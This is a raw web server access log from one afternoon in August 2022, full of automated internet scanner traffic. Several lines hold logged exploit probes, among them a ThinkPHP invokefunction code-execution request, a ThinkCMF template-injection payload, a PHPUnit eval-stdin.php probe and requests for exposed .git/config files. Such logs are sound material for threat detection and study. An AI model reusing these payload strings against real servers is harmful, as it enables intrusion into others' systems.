185.7.214.117 - - [13/Aug/2022:12:51:28 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
128.1.248.42 - - [13/Aug/2022:13:02:01 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.7.214.117 - - [13/Aug/2022:13:03:48 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.196.220.70 - - [13/Aug/2022:13:13:21 +0000] "GET / HTTP/1.1" 200 109 "-" "Linux Gnu (cow)"
185.7.214.117 - - [13/Aug/2022:13:46:35 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 16 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
154.89.5.210 - - [13/Aug/2022:14:09:45 +0000] "GET / HTTP/1.0" 200 109 "-" "-"
112.46.68.71 - - [13/Aug/2022:14:24:19 +0000] "GET / HTTP/1.1" 400 226 "-" "-"
141.98.9.13 - - [13/Aug/2022:14:42:45 +0000] "\x03" 400 226 "-" "-"
185.7.214.117 - - [13/Aug/2022:14:55:03 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
179.43.155.171 - - [13/Aug/2022:15:05:51 +0000] "\x16\x03\x01" 400 226 "-" "-"
179.43.155.171 - - [13/Aug/2022:15:05:51 +0000] "GET /wp-content/plugins/.git/config HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 11; Pixel 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36"
185.7.214.117 - - [13/Aug/2022:15:11:58 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
223.166.85.81 - - [13/Aug/2022:15:35:00 +0000] "GET / HTTP/1.0" 200 109 "-" "-"
185.7.214.117 - - [13/Aug/2022:16:24:51 +0000] "GET /console/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.7.214.117 - - [13/Aug/2022:16:27:17 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
167.71.61.213 - - [13/Aug/2022:16:30:16 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
35.233.62.116 - - [13/Aug/2022:16:50:47 +0000] "GET / HTTP/1.1" 200 109 "-" "python-requests/2.28.1"
107.182.129.239 - - [13/Aug/2022:16:56:46 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 196 "http://140.238.86.79:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
106.75.103.44 - - [13/Aug/2022:17:36:49 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.75.103.44 - - [13/Aug/2022:17:36:50 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
162.62.191.231 - - [13/Aug/2022:17:54:05 +0000] "GET / HTTP/1.1" 200 109 "-" "curl/7.64.1"
